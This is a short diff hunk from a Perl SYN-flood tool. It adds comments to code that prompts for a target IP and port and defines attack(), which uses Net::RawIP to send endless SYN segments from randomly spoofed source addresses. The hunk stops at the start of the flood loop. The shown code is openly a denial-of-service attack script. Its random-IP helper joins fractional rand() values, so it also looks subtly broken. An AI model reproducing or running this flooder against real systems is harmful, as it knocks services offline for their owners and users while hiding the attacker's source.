@@ -25,13 +25,15 @@ while (not ($port =~ /^-?\d+$/ ) || ($port <= 0 || $port > 65535)){
 	$port = <STDIN>;
 	chomp ($port); 
 } 
- 
+
 attack($ip,$port)
- 
+
+# Generates Random Ip
 sub randomIP(){
     return rand(255) . "." . rand(255) . "." . rand(255) . "." . rand(255);
 }
- 
+
+# Uses random source ip and destination ip to flood the destination with syn segments
 sub attack($dest_ip, $dest_port){
    $net_raw_ip = new Net::RawIP;
    while(1) {
